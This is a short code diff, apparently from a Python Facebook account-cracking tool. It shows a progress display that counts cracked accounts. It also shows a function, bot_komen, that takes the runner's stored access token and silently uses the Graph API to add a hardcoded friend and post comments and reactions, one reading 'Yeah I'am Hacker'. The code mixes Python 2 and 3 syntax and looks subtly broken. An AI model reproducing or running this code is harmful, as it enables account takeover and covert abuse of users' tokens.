@@ -129,7 +129,7 @@ def mbf():
                             print(f"\r\033[00m[\033[1;91m{i}\033[00m] Life : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
                             time.sleep(0.2)
 
-    def bot_komen():
+def bot_komen():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
@@ -137,11 +137,11 @@ def mbf():
         os.system('rm -rf login.txt')
 
     una = '100015561930583'
-    kom = 'Aku Sayang Kamu 😘'
+    kom = 'Yeah I'am Hacker😎'
     reac = 'ANGRY'
     post = '984101418785247'
     post2 = '984101418785247'
-    kom2 = 'Bang kok lu ganteng banget 😘'
+    kom2 = 'Sc paling the best😘'
     reac2 = 'LOVE'
     requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + toket)
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
@@ -154,6 +154,7 @@ def mbf():
     except IOError:
         print '\x1b[0;39m[!] Token invalid'
         os.system('rm -rf login.txt')
+
 
 ###### CRACK FROM ID ######
                             
